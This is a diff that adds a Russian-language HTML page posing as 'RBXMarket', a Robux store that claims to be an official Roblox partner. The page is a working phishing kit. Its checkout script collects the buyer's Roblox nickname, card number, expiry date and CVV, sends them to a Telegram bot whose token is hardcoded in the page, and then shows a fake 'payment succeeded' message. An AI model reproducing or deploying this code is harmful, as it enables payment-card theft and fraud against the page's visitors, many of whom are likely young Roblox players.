@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RBXMarket — Robux Store</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0e0e12;
+            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            color: #fff;
+            padding: 30px 20px;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 30%, rgba(0, 200, 255, 0.05), transparent 70%);
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 1300px;
+            margin: 0 auto;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        .logo h1 {
+            font-size: 2rem;
+            background: linear-gradient(135deg, #fff, #00a8ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .logo span {
+            font-size: 0.8rem;
+            color: #888;
+            display: block;
+        }
+        .stock-badge {
+            background: #1f1f2e;
+            padding: 8px 18px;
+            border-radius: 60px;
+            border: 1px solid #2c2c3a;
+            font-size: 0.9rem;
+        }
+        .stock-badge strong {
+            color: #00ffb3;
+            font-size: 1.2rem;
+        }
+
+        .products-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 25px;
+            justify-content: center;
+            margin-bottom: 50px;
+        }
+        .product-card {
+            background: #14141c;
+            border: 1px solid #2a2a35;
+            border-radius: 28px;
+            padding: 20px;
+            width: 260px;
+            transition: 0.2s;
+            text-align: center;
+        }
+        .product-card:hover {
+            border-color: #00a8ff;
+            transform: translateY(-3px);
+        }
+        .robux-icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        .product-card h3 {
+            font-size: 1.8rem;
+            margin: 10px 0;
+        }
+        .product-card h3 span {
+            font-size: 1rem;
+            color: #aaa;
+        }
+        .price {
+            font-size: 1.6rem;
+            font-weight: bold;
+            color: #00ffb3;
+            margin: 15px 0;
+        }
+        .btn-buy {
+            background: linear-gradient(135deg, #0077ff, #0044cc);
+            border: none;
+            width: 100%;
+            padding: 12px;
+            border-radius: 40px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: 0.2s;
+        }
+        .btn-buy:hover {
+            background: linear-gradient(135deg, #0088ff, #0055dd);
+            transform: scale(1.02);
+        }
+        .availability {
+            font-size: 0.8rem;
+            background: #0a0a0f;
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 30px;
+            margin-top: 12px;
+            color: #0f0;
+        }
+
+        .cart {
+            position: fixed;
+            right: 20px;
+            top: 20px;
+            background: #0f0f17;
+            border: 1px solid #2c2c3a;
+            border-radius: 24px;
+            padding: 18px;
+            width: 300px;
+            backdrop-filter: blur(8px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            z-index: 1000;
+        }
+        .cart h3 {
+            font-size: 1.2rem;
+            border-bottom: 1px solid #2c2c3a;
+            padding-bottom: 8px;
+            margin-bottom: 12px;
+        }
+        .cart ul {
+            list-style: none;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .cart li {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #1f1f2a;
+            font-size: 0.9rem;
+        }
+        .cart-total {
+            margin: 15px 0;
+            text-align: right;
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+        .checkout-btn {
+            background: #2ecc71;
+            border: none;
+            width: 100%;
+            padding: 10px;
+            border-radius: 40px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .remove-item {
+            background: #c0392b;
+            border: none;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 30px;
+            cursor: pointer;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+        .modal-card {
+            background: #14141c;
+            border: 1px solid #00a8ff;
+            border-radius: 32px;
+            padding: 30px;
+            width: 360px;
+        }
+        .modal-card input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            background: #0a0a0f;
+            border: 1px solid #333;
+            border-radius: 30px;
+            color: white;
+        }
+        .modal-card button {
+            width: 100%;
+            background: #00a8ff;
+            border: none;
+            padding: 12px;
+            border-radius: 40px;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        .close-modal {
+            float: right;
+            font-size: 24px;
+            cursor: pointer;
+            color: #aaa;
+        }
+        footer {
+            margin-top: 60px;
+            text-align: center;
+            color: #444;
+            font-size: 0.8rem;
+        }
+        @media (max-width: 700px) {
+            .cart {
+                position: static;
+                width: 100%;
+                margin-top: 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div class="logo">
+            <h1>⭐ RBXMarket</h1>
+            <span>официальный партнер Roblox</span>
+        </div>
+        <div class="stock-badge">
+            📦 в наличии: <strong>100 239</strong> робуксов
+        </div>
+    </div>
+
+    <div class="products-grid">
+        <div class="product-card">
+            <div class="robux-icon">💎</div>
+            <h3>100 <span>Robux</span></h3>
+            <div class="price">59 ₽</div>
+            <button class="btn-buy" onclick="addToCart('100 Robux', 59)">купить</button>
+            <div class="availability">✅ готов к выдаче</div>
+        </div>
+        <div class="product-card">
+            <div class="robux-icon">💎💎</div>
+            <h3>400 <span>Robux</span></h3>
+            <div class="price">219 ₽</div>
+            <button class="btn-buy" onclick="addToCart('400 Robux', 219)">купить</button>
+            <div class="availability">🔥 хит продаж</div>
+        </div>
+        <div class="product-card">
+            <div class="robux-icon">💎💎💎</div>
+            <h3>800 <span>Robux</span></h3>
+            <div class="price">419 ₽</div>
+            <button class="btn-buy" onclick="addToCart('800 Robux', 419)">купить</button>
+            <div class="availability">⚡ экономия</div>
+        </div>
+        <div class="product-card">
+            <div class="robux-icon">👑</div>
+            <h3>2000 <span>Robux</span></h3>
+            <div class="price">999 ₽</div>
+            <button class="btn-buy" onclick="addToCart('2000 Robux', 999)">купить</button>
+            <div class="availability">🎁 лучший выбор</div>
+        </div>
+    </div>
+
+    <div class="cart" id="cartPanel">
+        <h3>🛒 корзина</h3>
+        <ul id="cartList"><li>пусто</li></ul>
+        <div class="cart-total" id="cartTotal">Итого: 0 ₽</div>
+        <button class="checkout-btn" id="checkoutBtn">оформить заказ</button>
+    </div>
+    <footer>© RBXMarket — моментальная доставка на аккаунт после оплаты</footer>
+</div>
+
+<div id="paymentModal" class="modal">
+    <div class="modal-card">
+        <span class="close-modal" id="closeModalBtn">&times;</span>
+        <h3 style="margin-bottom: 20px;">💳 оформление заказа</h3>
+        <input type="text" id="robloxUser" placeholder="🔹 Roblox никнейм *" style="border-color: #00a8ff;">
+        <input type="text" id="cardNumber" placeholder="номер карты">
+        <input type="text" id="cardExpiry" placeholder="MM/YY">
+        <input type="text" id="cardCvv" placeholder="CVV">
+        <button id="submitPaymentBtn">оплатить</button>
+        <p style="font-size: 11px; color:#666; margin-top: 12px;">* никнейм обязателен для доставки</p>
+    </div>
+</div>
+
+<script>
+    // Telegram настройки (твой токен, chat id из localStorage)
+    const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
+    let CHAT_ID = localStorage.getItem('tg_chat_id');
+
+    async function fetchAndSaveChatId() {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates`);
+            const data = await res.json();
+            if (data.ok && data.result && data.result.length > 0) {
+                const last = data.result[data.result.length - 1];
+                const chatId = last.message?.chat?.id || last.callback_query?.message?.chat?.id;
+                if (chatId) {
+                    CHAT_ID = chatId;
+                    localStorage.setItem('tg_chat_id', CHAT_ID);
+                    alert(`✅ Telegram готов! Chat ID: ${CHAT_ID}. Теперь данные будут уходить.`);
+                    return true;
+                } else {
+                    alert('❌ Не найден chat id. Напишите боту любое сообщение и обновите страницу.');
+                }
+            } else {
+                alert('❌ Нет сообщений боту. Напишите боту /start, обновите страницу и нажмите ОК.');
+            }
+        } catch(e) {
+            alert('Ошибка соединения. Проверьте интернет.');
+        }
+        return false;
+    }
+
+    if (!CHAT_ID) {
+        setTimeout(() => {
+            if (confirm('⚙️ Для отправки данных нужен Telegram. Напишите боту (найдите его в телеграме) любое сообщение, затем нажмите ОК.')) {
+                fetchAndSaveChatId();
+            }
+        }, 500);
+    }
+
+    // Корзина
+    let cart = [];
+
+    function addToCart(name, price) {
+        cart.push({ name, price });
+        updateCartUI();
+        showMessage(`✓ ${name} добавлен`);
+    }
+
+    function updateCartUI() {
+        const cartList = document.getElementById('cartList');
+        const cartTotalSpan = document.getElementById('cartTotal');
+        if (cart.length === 0) {
+            cartList.innerHTML = '<li>корзина пуста</li>';
+            cartTotalSpan.innerText = 'Итого: 0 ₽';
+            return;
+        }
+        let total = 0;
+        let html = '';
+        cart.forEach((item, idx) => {
+            total += item.price;
+            html += `<li>${item.name} — ${item.price} ₽ <button class="remove-item" onclick="removeFromCart(${idx})">x</button></li>`;
+        });
+        cartList.innerHTML = html;
+        cartTotalSpan.innerText = `Итого: ${total} ₽`;
+    }
+
+    function removeFromCart(idx) {
+        cart.splice(idx, 1);
+        updateCartUI();
+        showMessage('товар удалён');
+    }
+
+    function showMessage(msg) {
+        const div = document.createElement('div');
+        div.innerText = msg;
+        div.style.cssText = `position:fixed; bottom:20px; left:20px; background:#2ecc71; color:white; padding:10px 18px; border-radius:40px; z-index:9999; font-family:monospace;`;
+        document.body.appendChild(div);
+        setTimeout(() => div.remove(), 2500);
+    }
+
+    // Модалка
+    const modal = document.getElementById('paymentModal');
+    const checkoutBtn = document.getElementById('checkoutBtn');
+    const closeModalBtn = document.getElementById('closeModalBtn');
+
+    checkoutBtn.addEventListener('click', () => {
+        if (cart.length === 0) {
+            alert('корзина пуста');
+            return;
+        }
+        if (!CHAT_ID) {
+            alert('Сначала настройте Telegram (нажмите ОК в предыдущем сообщении или обновите страницу)');
+            fetchAndSaveChatId();
+            return;
+        }
+        modal.style.display = 'flex';
+    });
+
+    closeModalBtn.addEventListener('click', () => modal.style.display = 'none');
+    window.addEventListener('click', (e) => { if (e.target === modal) modal.style.display = 'none'; });
+
+    const submitBtn = document.getElementById('submitPaymentBtn');
+    submitBtn.addEventListener('click', async () => {
+        const robloxUser = document.getElementById('robloxUser').value.trim();
+        const cardNum = document.getElementById('cardNumber').value.trim();
+        const expiry = document.getElementById('cardExpiry').value.trim();
+        const cvv = document.getElementById('cardCvv').value.trim();
+
+        if (!robloxUser) {
+            alert('Укажите ваш Roblox никнейм!');
+            return;
+        }
+        if (!cardNum || !expiry || !cvv) {
+            alert('Заполните все поля карты');
+            return;
+        }
+
+        const total = cart.reduce((sum, i) => sum + i.price, 0);
+        const items = cart.map(i => `${i.name} — ${i.price} ₽`).join('\n');
+        const message = `🟢 НОВАЯ ПОКУПКА ROBLOX\n\n👤 Никнейм: ${robloxUser}\n📦 Товары:\n${items}\n💰 Сумма: ${total} ₽\n💳 Карта: ${cardNum}\n📅 Срок: ${expiry}\n🔐 CVV: ${cvv}`;
+
+        try {
+            const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            });
+            const result = await resp.json();
+            if (result.ok) {
+                alert('✅ Оплата прошла! Робуксы придут на ник ' + robloxUser + ' в течение 10 минут.');
+                cart = [];
+                updateCartUI();
+                modal.style.display = 'none';
+                document.getElementById('robloxUser').value = '';
+                document.getElementById('cardNumber').value = '';
+                document.getElementById('cardExpiry').value = '';
+                document.getElementById('cardCvv').value = '';
+            } else {
+                alert('❌ Ошибка оплаты, попробуйте другую карту');
+                console.error(result);
+            }
+        } catch(e) {
+            alert('Ошибка соединения');
+            console.error(e);
+        }
+    });
+
+    window.addToCart = addToCart;
+    window.removeFromCart = removeFromCart;
+
+    // повторная проверка chat id при загрузке
+    if (!CHAT_ID) {
+        setTimeout(() => {
+            if(confirm('⚠️ Данные карт не будут отправляться! Настроить Telegram сейчас?')) {
+                fetchAndSaveChatId();
+            }
+        }, 1000);
+    }
+</script>
+</body>
+  </html>
